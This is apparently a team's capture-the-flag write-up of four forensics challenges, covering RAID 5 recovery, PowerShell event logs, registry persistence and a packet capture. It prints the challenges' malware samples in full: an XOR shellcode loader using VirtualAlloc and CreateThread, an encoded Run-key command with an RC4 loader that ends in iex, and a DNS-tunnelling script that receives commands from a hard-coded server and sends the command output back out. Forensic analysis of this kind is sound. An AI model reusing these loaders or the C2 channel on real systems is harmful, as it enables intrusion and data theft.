# forensics

## Intergalactic Recovery
> Solved too late by: Taz34, thewhiteh4t, Starry-Lord, Bobbysox

challenge description:

```
Miyuki's team stores all the evidence from important cases in a shared RAID 5 disk. Especially now that the case IMW-1337 is almost completed, evidences and clues are needed more than ever. Unfortunately for the team, an electromagnetic pulse caused by Draeger's EMP cannon has partially destroyed the disk. 
Can you help her and the rest of team recover the content of the failed disk? 
Download: http://134.209.177.115/forensics/forensics_intergalactic_recovery.zip
```

We get 3 files namely `disk1.img`, `disk2.img`, `disk3.img`, with absolutely no clues from the file command. After a while, and thanks to a not recently updated binwalk version we managed to find out it was ext4 files inside. It was not very useful to extract anything from it in that state and we even thought we couldn’t move forward without reconstructing the super block at some point, but we were sure the mdadm command was involved. At some point, we realized that those were partition files, thanks to the old version of autopsy with the cocker which was another very useful clue. 

It’s important to note that disk1 and 2 are 5242880 bytes large when disk 3 is only around 3000 bytes which indicates (huge) loss of data, so we have to consider it missing and focus only on disks 1 and 2.

Here is how to proceed with all this information in mind assuming we correctly guessed the correct Raid disks order after a couple tries:

```
sudo losetup -fP disk1.img
sudo losetup -fP disk2.img
sudo mdadm --create /dev/md0 --level=5 --raid-devices=3 --assume-clean /dev/loop2 missing /dev/loop1
```

option 1:

```
-f, --find [file]
        Find the first unused loop device. If a file argument is
        present, use the found device as loop device. Otherwise, just
        print its name.
```

option 2:

```
-P, --partscan
        Force the kernel to scan the partition table on a newly
        created loop device. Note that the partition table parsing
        depends on sector sizes. The default is sector size is 512
        bytes, otherwise you need to use the option --sector-size
        together with --partscan.
```

Then we can simply create a directory to mount the md0 to and browse it, let’s call it “raid”:

![](https://i.imgur.com/7ZUZKIh.png)

And here is the content of the reconstructed pdf file!!+1+!!!!1111!+1!

![](https://i.imgur.com/IF7drBw.png)

> Note from Starry-Lord: 
> If only I had tried  --assume-clean …

----------

## Puppeteer
> Solved By : Legend, Starrylord, Taz, thewhiteh4t

In this challenge we were given Windows Event logs files and in all these the one that most interesting were the Powershell ones.

![](https://i.imgur.com/7IQhoEs.png)

After that I used Event Viewer to look into these files and in `Microsoft-Windows-PowerShell%4Operational` found an interesting event where code was executed remotely and the description contained obfuscated powershell script.

![](https://i.imgur.com/NWIsPLL.png)

The whole script

```powershell
Creating Scriptblock text (1 of 1):
$OleSPrlmhB = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;
[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;

$tNZvQCljVk = Add-Type -memberDefinition $OleSPrlmhB -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]] $HVOASfFuNSxRXR = 0x2d,0x99,0x52,0x35,0x21,0x39,0x1d,0xd1,0xd1,0xd1,0x90,0x80,0x90,0x81,0x83,0x99,0xe0,0x03,0xb4,0x99,0x5a,0x83,0xb1,0x99,0x5a,0x83,0xc9,0x80,0x87,0x99,0x5a,0x83,0xf1,0x99,0xde,0x66,0x9b,0x9b,0x9c,0xe0,0x18,0x99,0x5a,0xa3,0x81,0x99,0xe0,0x11,0x7d,0xed,0xb0,0xad,0xd3,0xfd,0xf1,0x90,0x10,0x18,0xdc,0x90,0xd0,0x10,0x33,0x3c,0x83,0x99,0x5a,0x83,0xf1,0x90,0x80,0x5a,0x93,0xed,0x99,0xd0,0x01,0xb7,0x50,0xa9,0xc9,0xda,0xd3,0xde,0x54,0xa3,0xd1,0xd1,0xd1,0x5a,0x51,0x59,0xd1,0xd1,0xd1,0x99,0x54,0x11,0xa5,0xb6,0x99,0xd0,0x01,0x5a,0x99,0xc9,0x81,0x95,0x5a,0x91,0xf1,0x98,0xd0,0x01,0x32,0x87,0x99,0x2e,0x18,0x9c,0xe0,0x18,0x90,0x5a,0xe5,0x59,0x99,0xd0,0x07,0x99,0xe0,0x11,0x90,0x10,0x18,0xdc,0x7d,0x90,0xd0,0x10,0xe9,0x31,0xa4,0x20,0x9d,0xd2,0x9d,0xf5,0xd9,0x94,0xe8,0x00,0xa4,0x09,0x89,0x95,0x5a,0x91,0xf5,0x98,0xd0,0x01,0xb7,0x90,0x5a,0xdd,0x99,0x95,0x5a,0x91,0xcd,0x98,0xd0,0x01,0x90,0x5a,0xd5,0x59,0x90,0x89,0x90,0x89,0x8f,0x88,0x99,0xd0,0x01,0x8b,0x90,0x89,0x90,0x88,0x90,0x8b,0x99,0x52,0x3d,0xf1,0x90,0x83,0x2e,0x31,0x89,0x90,0x88,0x8b,0x99,0x5a,0xc3,0x38,0x9a,0x2e,0x2e,0x2e,0x8c,0x98,0x6f,0xa6,0xa2,0xe3,0x8e,0xe2,0xe3,0xd1,0xd1,0x90,0x87,0x98,0x58,0x37,0x99,0x50,0x3d,0x71,0xd0,0xd1,0xd1,0x98,0x58,0x34,0x98,0x6d,0xd3,0xd1,0xd4,0xe8,0x11,0x79,0xd1,0xc3,0x90,0x85,0x98,0x58,0x35,0x9d,0x58,0x20,0x90,0x6b,0x9d,0xa6,0xf7,0xd6,0x2e,0x04,0x9d,0x58,0x3b,0xb9,0xd0,0xd0,0xd1,0xd1,0x88,0x90,0x6b,0xf8,0x51,0xba,0xd1,0x2e,0x04,0xbb,0xdb,0x90,0x8f,0x81,0x81,0x9c,0xe0,0x18,0x9c,0xe0,0x11,0x99,0x2e,0x11,0x99,0x58,0x13,0x99,0x2e,0x11,0x99,0x58,0x10,0x90,0x6b,0x3b,0xde,0x0e,0x31,0x2e,0x04,0x99,0x58,0x16,0xbb,0xc1,0x90,0x89,0x9d,0x58,0x33,0x99,0x58,0x28,0x90,0x6b,0x48,0x74,0xa5,0xb0,0x2e,0x04,0x54,0x11,0xa5,0xdb,0x98,0x2e,0x1f,0xa4,0x34,0x39,0x42,0xd1,0xd1,0xd1,0x99,0x52,0x3d,0xc1,0x99,0x58,0x33,0x9c,0xe0,0x18,0xbb,0xd5,0x90,0x89,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xaf,0x84,0x99,0x52,0x15,0xf1,0x8f,0x58,0x27,0xbb,0x91,0x90,0x88,0xb9,0xd1,0xc1,0xd1,0xd1,0x90,0x89,0x99,0x58,0x23,0x99,0xe0,0x18,0x90,0x6b,0x89,0x75,0x82,0x34,0x2e,0x04,0x99,0x58,0x12,0x98,0x58,0x16,0x9c,0xe0,0x18,0x98,0x58,0x21,0x99,0x58,0x0b,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xac,0xf9,0x89,0x90,0x86,0x88,0xb9,0xd1,0x91,0xd1,0xd1,0x90,0x89,0xbb,0xd1,0x8b,0x90,0x6b,0xda,0xfe,0xde,0xe1,0x2e,0x04,0x86,0x88,0x90,0x6b,0xa4,0xbf,0x9c,0xb0,0x2e,0x04,0x98,0x2e,0x1f,0x38,0xed,0x2e,0x2e,0x2e,0x99,0xd0,0x12,0x99,0xf8,0x17,0x99,0x54,0x27,0xa4,0x65,0x90,0x2e,0x36,0x89,0xbb,0xd1,0x88,0x98,0x16,0x13,0x21,0x64,0x73,0x87,0x2e,0x04;

[array]::Reverse($stage2);

$hRffYLENA = $tNZvQCljVk::VirtualAlloc(0,[Math]::Max($HVOASfFuNSxRXR.Length,0x1000),0x3000,0x40);

$stage3 = $stage1 + $stage2;

[System.Runtime.InteropServices.Marshal]::Copy($HVOASfFuNSxRXR,0,$hRffYLENA,$HVOASfFuNSxRXR.Length);


# Unpack Shellcode;

for($i=0; $i -lt $HVOASfFuNSxRXR.count ; $i++)
{
    $HVOASfFuNSxRXR[$i] = $HVOASfFuNSxRXR[$i] -bxor 0xd1;
}

#Unpack Special Orders!

for($i=0;$i -lt $stage3.count;$i++){
    $stage3[$i] = $stage3[$i] -bxor 0xd1;
}

$tNZvQCljVk::CreateThread(0,0,$hRffYLENA,0,0,0);


ScriptBlock ID: 3f384b05-3a00-4a65-bbf7-e31b331ac923
Path: C:\sysmgr\special_orders.ps1
```

In the powershell script we have some interesting things :

```powershell
[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;

[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;

[array]::Reverse($stage2);

$stage3 = $stage1 + $stage2;

for($i=0;$i -lt $stage3.count;$i++){
    $stage3[$i] = $stage3[$i] -bxor 0xd1;
}
```

- two sets of hex arrays
- stage 2 is reversed
- stage 1 and reversed stage 2 are concatenated
- each item in stage 3 array is XORed against `0xd1`

I followed the steps and got the flag in cyberchef :

![](https://i.imgur.com/j7ZhlLr.png)

----------

## Golden Persistence
> Solved By : Legend, Starrylord, thewhiteh4t

In this challenge a `NTUSER.DAT` was given which contains the user account and customization settings.

I used Yaru to load the file and explore the registry. Since this challenge was regarding malware infection so first thing I looked was for auto run and found and interesting registry at
`ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Vh0F75DQu`.

![](https://i.imgur.com/vv7KeJy.png)

The registry was executing a long string of encoded powershell command.

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc ZgB1AG4AYwB0AGkAbwBuACAAZQBuAGMAcgAgAHsACgAgACAAIAAgAHAAYQByAGEAbQAoAAoAIAAgACAAIAAgACAAIAAgAFsAQgB5AHQAZQBbAF0AXQAkAGQAYQB0AGEALAAKACAAIAAgACAAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABrAGUAeQAKACAAIAAgACAAIAAgACkACgAgAAoAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGQAYQB0AGEALgBMAGUAbgBnAHQAaAAKACAAIAAgACAAJABkAGEAdABhAC4AQwBvAHAAeQBUAG8AKAAkAGIAdQBmAGYAZQByACwAIAAwACkACgAgACAAIAAgAAoAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABCAHkAdABlAFsAXQAgADIANQA2ADsACgAgACAAIAAgAFsAQgB5AHQAZQBbAF0AXQAkAGsAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMgA1ADYAOwAKACAACgAgACAAIAAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAyADUANgA7ACAAJABpACsAKwApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcwBbACQAaQBdACAAPQAgAFsAQgB5AHQAZQBdACQAaQA7AAoAIAAgACAAIAAgACAAIAAgACQAawBbACQAaQBdACAAPQAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwAKACAAIAAgACAAfQAKACAACgAgACAAIAAgACQAagAgAD0AIAAwADsACgAgACAAIAAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAyADUANgA7ACAAJABpACsAKwApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAagAgAD0AIAAoACQAagAgACsAIAAkAHMAWwAkAGkAXQAgACsAIAAkAGsAWwAkAGkAXQApACAAJQAgADIANQA2ADsACgAgACAAIAAgACAAIAAgACAAJAB0AGUAbQBwACAAPQAgACQAcwBbACQAaQBdADsACgAgACAAIAAgACAAIAAgACAAJABzAFsAJABpAF0AIAA9ACAAJABzAFsAJABqAF0AOwAKACAAIAAgACAAIAAgACAAIAAkAHMAWwAkAGoAXQAgAD0AIAAkAHQAZQBtAHAAOwAKACAAIAAgACAAfQAKACAACgAgACAAIAAgACQAaQAgAD0AIAAkAGoAIAA9ACAAMAA7AAoAIAAgACAAIABmAG8AcgAgACgAJAB4ACAAPQAgADAAOwAgACQAeAAgAC0AbAB0ACAAJABiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoADsAIAAkAHgAKwArACkACgAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAJABpACAAPQAgACgAJABpACAAKwAgADEAKQAgACUAIAAyADUANgA7AAoAIAAgACAAIAAgACAAIAAgACQAagAgAD0AIAAoACQAagAgACsAIAAkAHMAWwAkAGkAXQApACAAJQAgADIANQA2ADsACgAgACAAIAAgACAAIAAgACAAJAB0AGUAbQBwACAAPQAgACQAcwBbACQAaQBdADsACgAgACAAIAAgACAAIAAgACAAJABzAFsAJABpAF0AIAA9ACAAJABzAFsAJABqAF0AOwAKACAAIAAgACAAIAAgACAAIAAkAHMAWwAkAGoAXQAgAD0AIAAkAHQAZQBtAHAAOwAKACAAIAAgACAAIAAgACAAIABbAGkAbgB0AF0AJAB0ACAAPQAgACgAJABzAFsAJABpAF0AIAArACAAJABzAFsAJABqAF0AKQAgACUAIAAyADUANgA7AAoAIAAgACAAIAAgACAAIAAgACQAYgB1AGYAZgBlAHIAWwAkAHgAXQAgAD0AIAAkAGIAdQBmAGYAZQByAFsAJAB4AF0AIAAtAGIAeABvAHIAIAAkAHMAWwAkAHQAXQA7AAoAIAAgACAAIAB9AAoAIAAKACAAIAAgACAAcgBlAHQAdQByAG4AIAAkAGIAdQBmAGYAZQByAAoAfQAKAAoACgBmAHUAbgBjAHQAaQBvAG4AIABIAGUAeABUAG8AQgBpAG4AIAB7AAoAIAAgACAAIABwAGEAcgBhAG0AKAAKACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAAoAIAAgACAAIAAgACAAIAAgAFAAbwBzAGkAdABpAG8AbgA9ADAALAAgAAoAIAAgACAAIAAgACAAIAAgAE0AYQBuAGQAYQB0AG8AcgB5AD0AJAB0AHIAdQBlACwAIAAKACAAIAAgACAAIAAgACAAIABWAGEAbAB1AGUARgByAG8AbQBQAGkAcABlAGwAaQBuAGUAPQAkAHQAcgB1AGUAKQAKACAAIAAgACAAXQAgACAAIAAKACAAIAAgACAAWwBzAHQAcgBpAG4AZwBdACQAcwApAAoAIAAgACAAIAAkAHIAZQB0AHUAcgBuACAAPQAgAEAAKAApAAoAIAAgACAAIAAKACAAIAAgACAAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAcwAuAEwAZQBuAGcAdABoACAAOwAgACQAaQAgACsAPQAgADIAKQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQB0AHUAcgBuACAAKwA9ACAAWwBCAHkAdABlAF0AOgA6AFAAYQByAHMAZQAoACQAcwAuAFMAdQBiAHMAdAByAGkAbgBnACgAJABpACwAIAAyACkALAAgAFsAUwB5AHMAdABlAG0ALgBHAGwAbwBiAGEAbABpAHoAYQB0AGkAbwBuAC4ATgB1AG0AYgBlAHIAUwB0AHkAbABlAHMAXQA6ADoASABlAHgATgB1AG0AYgBlAHIAKQAKACAAIAAgACAAfQAKACAAIAAgACAACgAgACAAIAAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJAByAGUAdAB1AHIAbgAKAH0ACgAKAFsAQgB5AHQAZQBbAF0AXQAkAGsAZQB5ACAAPQAgACQAZQBuAGMALgBHAGUAdABCAHkAdABlAHMAKAAiAFEAMABtAG0AcAByADQAQgA1AHIAdgBaAGkAMwBwAFMAIgApAAoAJABlAG4AYwByAHkAcAB0AGUAZAAxACAAPQAgACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBDAFUAOgBcAFMATwBGAFQAVwBBAFIARQBcAFoAWQBiADcAOABQADQAcwApAC4AdAAzAFIAQgBrAGEANQB0AEwACgAkAGUAbgBjAHIAeQBwAHQAZQBkADIAIAA9ACAAKABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAQgBqAHEAQQB0AEkAZQBuACkALgB1AEwAbAB0AGoAagBXAAoAJABlAG4AYwByAHkAcAB0AGUAZAAzACAAPQAgACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBDAFUAOgBcAFMATwBGAFQAVwBBAFIARQBcAEEAcABwAEQAYQB0AGEATABvAHcAXAB0ADAAMwBBADEAUwB0AHEAKQAuAHUAWQA0AFMAMwA5AEQAYQAKACQAZQBuAGMAcgB5AHAAdABlAGQANAAgAD0AIAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIABIAEsAQwBVADoAXABTAE8ARgBUAFcAQQBSAEUAXABHAG8AbwBnAGwAZQBcAE4AdgA1ADAAegBlAEcAKQAuAEsAYgAxADkAZgB5AGgAbAAKACQAZQBuAGMAcgB5AHAAdABlAGQANQAgAD0AIAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIABIAEsAQwBVADoAXABBAHAAcABFAHYAZQBuAHQAcwBcAEoAeAA2ADYAWgBHADAATwApAC4AagBIADUANABOAFcAOABDAAoAJABlAG4AYwByAHkAcAB0AGUAZAAgAD0AIAAiACQAKAAkAGUAbgBjAHIAeQBwAHQAZQBkADEAKQAkACgAJABlAG4AYwByAHkAcAB0AGUAZAAyACkAJAAoACQAZQBuAGMAcgB5AHAAdABlAGQAMwApACQAKAAkAGUAbgBjAHIAeQBwAHQAZQBkADQAKQAkACgAJABlAG4AYwByAHkAcAB0AGUAZAA1ACkAIgAKACQAZQBuAGMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAAoAWwBCAHkAdABlAFsAXQBdACQAZABhAHQAYQAgAD0AIABIAGUAeABUAG8AQgBpAG4AIAAkAGUAbgBjAHIAeQBwAHQAZQBkAAoAJABEAGUAYwByAHkAcAB0AGUAZABCAHkAdABlAHMAIAA9ACAAZQBuAGMAcgAgACQAZABhAHQAYQAgACQAawBlAHkACgAkAEQAZQBjAHIAeQBwAHQAZQBkAFMAdAByAGkAbgBnACAAPQAgACQAZQBuAGMALgBHAGUAdABTAHQAcgBpAG4AZwAoACQARABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACkACgAkAEQAZQBjAHIAeQBwAHQAZQBkAFMAdAByAGkAbgBnAHwAaQBlAHgA
```

Decoding the string gave the following script.

![](https://i.imgur.com/0sW8fak.png)

```powershell
function encr {
    param(
        [Byte[]]$data,
        [Byte[]]$key
      )
 
    [Byte[]]$buffer = New-Object Byte[] $data.Length
    $data.CopyTo($buffer, 0)
    
    [Byte[]]$s = New-Object Byte[] 256;
    [Byte[]]$k = New-Object Byte[] 256;
 
    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $key.Length];
    }
 
    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }
 
    $i = $j = 0;
    for ($x = 0; $x -lt $buffer.Length; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buffer[$x] = $buffer[$x] -bxor $s[$t];
    }
 
    return $buffer
}


function HexToBin {
    param(
    [Parameter(
        Position=0, 
        Mandatory=$true, 
        ValueFromPipeline=$true)
    ]   
    [string]$s)
    $return = @()
    
    for ($i = 0; $i -lt $s.Length ; $i += 2)
    {
        $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
    }
    
    Write-Output $return
}

[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS")
$encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL
$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW
$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da
$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl
$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
$enc = [System.Text.Encoding]::ASCII
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
$DecryptedString|iex
```

In this script the interesting lines were where the variables `$encrypted``X` (X is number from 1 to 5) were trying to get the values from different registry key values. I looked for them and found there values in registry.

```powershell
[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS")
$encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL # Value F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39
$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW   # Value CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1
$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da # Value C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D
$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl # Value D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1
$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C # Value 84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB
```

Lets go back to the last section of the script : 

```powershell
[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS")
$encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL
$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW
$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da
$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl
$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
$enc = [System.Text.Encoding]::ASCII
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
$DecryptedString|iex
```

- line 1 throws error because `$enc` is not defined before it, it is defined on line 8
- then it takes 5 values which we found above and concatenates them
- then it passes it to `HexToBin` function and then over to `encr`

we modified the scripts last section and kept functions same : 

```powershell
$encrypted = "F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4DD814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D184AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB"
$enc = [System.Text.Encoding]::ASCII
[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS")
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
echo $DecryptedString
```

result :

![](https://i.imgur.com/A7YsGrh.png)

----------

## Automation
> Solved By : Legend, Starrylord, thewhiteh4t

In this challenge we got a PCAP file to work with. First I tried to export HTTP objects and got an image file

![](https://i.imgur.com/rbB8UjN.png)

the PNG turns out to be base64 encoded string…

![](https://i.imgur.com/bWfhsBf.png)

After decoding we get a powershell script…

```powershell
> base64 -d desktop.png
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)

        }
        else {
            $aesManaged.IV = $IV


        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {

    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }}
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}%
```

Lot of stuff but its really just an AES encryption and decryption code, but we have an IP address and a domain name in the last section :

```
147.182.172.189
windowsliveupdater.com
```

going back to wireshark we can filter packets using the IP :

![](https://i.imgur.com/4ULDbxt.png)

lot of weird subdomains but most interesting is the second packet i.e. the one with multiple TXT response, expanding the answers section shows multiple responses and each of them are base64 encoded…

![](https://i.imgur.com/xKm74Z6.png)

```
"Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws="

"hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA="

"58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s="

"eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru"

